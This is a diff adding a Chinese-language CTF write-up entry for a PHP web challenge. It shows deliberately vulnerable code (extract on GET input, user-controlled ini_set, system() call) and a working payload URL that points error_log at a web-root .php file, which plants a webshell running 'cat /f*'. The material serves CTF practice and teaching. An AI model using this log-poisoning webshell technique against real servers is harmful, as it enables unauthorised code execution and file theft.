@@ -1,4 +1,48 @@
 # web
+## 红包挑战
+### 7
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2023-08-08 00:12:34
+# @Last Modified by:   h1xa
+# @Last Modified time: 2023-08-08 00:26:48
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+highlight_file(__FILE__);
+error_reporting(2);
+
+
+extract($_GET);
+ini_set($name,$value);
+
+
+system(
+    "ls '".filter($_GET[1])."'"
+);
+
+function filter($cmd){
+    $cmd = str_replace("'","",$cmd);
+    $cmd = str_replace("\\","",$cmd);
+    $cmd = str_replace("`","",$cmd);
+    $cmd = str_replace("$","",$cmd);
+    return $cmd;
+}
+
+
+```
+
+使用`ini_set`设置`error_log`到web目录,同时传入1来报错写马
+
+`?name=error_log&value=/var/www/html/1.php&1=%00<?php system("cat /f*");?>`
+
 
 ## AK赛
 ### 签到_观己
